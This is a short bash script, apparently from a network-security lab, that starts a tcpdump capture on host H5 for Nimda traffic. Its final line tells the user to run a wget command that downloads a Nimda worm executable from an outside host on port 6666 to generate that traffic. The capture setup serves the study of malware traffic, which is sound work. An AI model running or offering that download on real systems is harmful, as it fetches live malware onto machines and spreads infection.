#!/bin/bash
# Captures attack traffic on H5 interface

PCAP_PATH="../pcaps/nimda_$(date +%Y%m%d_%H%M%S).pcap"

echo "[+] Starting tcpdump on H5-eth0..."
xterm -hold -e "sudo tcpdump -i H5-eth0 -w $PCAP_PATH" &

echo "[+] PCAP will be saved to: $PCAP_PATH"
echo "    Run 'wget 209.165.202.133:6666/W32.Nimda.Amm.exe' on H5 to generate traffic."
